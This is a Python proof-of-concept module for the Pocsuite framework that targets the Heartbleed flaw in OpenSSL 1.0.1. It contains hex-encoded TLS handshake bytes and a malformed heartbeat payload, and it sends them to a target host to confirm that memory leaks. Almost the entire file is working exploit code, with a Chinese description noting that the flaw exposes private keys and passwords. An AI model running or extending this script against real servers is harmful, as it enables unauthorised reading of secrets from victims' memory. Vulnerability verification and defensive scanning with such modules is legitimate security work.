#!/usr/bin/env python
# -*- coding:utf-8 -*-


import sys
import struct
import socket
import time
import select
import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register


def request2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')


client_key_exchange = request2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')


malformed_heartbeat = request2bin('''
18 03 02 00 03
01 40 00
''')


def get_msg_from_socket(some_socket, msg_length, time_out=5):

    end_time = time.time() + time_out

    received_data = ''

    remaining_msg = msg_length

    while remaining_msg > 0:

        read_time = end_time - time.time()

        if read_time < 0:
            return None
        read_socket, write_socket, error_socket = select.select([some_socket], [], [], time_out)

        if some_socket in read_socket:

            data = some_socket.recv(remaining_msg)

            if not data:
                return None

            else:
                received_data += data
                remaining_msg -= len(data)

        else:
            pass

    return received_data
        

def recv_msg(a_socket):

    header = get_msg_from_socket(a_socket, 5)

    if header is None:
        return None, None, None

    message_type, message_version, message_length = struct.unpack('>BHH', header)
    message_payload = get_msg_from_socket(a_socket, message_length, 10)

    if message_payload is None:
        return None, None, None

    return message_type, message_version, message_payload


def send_n_catch_heartbeat(our_socket):

    our_socket.send(malformed_heartbeat)

    while True:

        content_type, content_version, content_payload = recv_msg(our_socket)

        if content_type is None:
            return False

        if content_type == 24:
            return True

        if content_type == 21:
            return False


def main(rhost):

    local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip, port = rhost[8:].split(':')
    local_socket.connect((ip, int(port)))
    local_socket.send(client_key_exchange)

    while True:
        type, version, payload = recv_msg(local_socket)
        if not type:
            return
        if type == 22 and ord(payload[0]) == 0x0E:
            break

    local_socket.send(malformed_heartbeat)
    return send_n_catch_heartbeat(local_socket)


class TestPOC(POCBase):
    vulID = '1219'
    version = '1'
    author = 'zhangl'
    vulDate = '2014-04-08'
    createDate = '2014-04-08'
    updateDate = '2014-04-08'
    references = ['http://drops.wooyun.org/papers/1381']
    name = 'Openssl 1.0.1 内存读取 信息泄露漏洞'
    appPowerLink = 'https://www.openssl.org/'
    appName = 'OpenSSL'
    appVersion = '1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1'
    vulType = 'Information Disclosure'
    desc = '''
                    OpenSSL是一个强大的安全套接字层密码库。
                    这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。
                    安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据。
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        # print self.url
        response = main(self.url)
        return self.parse_attack(response)

    def _attack(self):
        return self._verify()

    def parse_attack(self, response):
        output = Output(self)
        result = {}

        if response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = '%s' % self.url
            output.success(result)
        else:
            output.fail('Fail test')

        return output


register(TestPOC)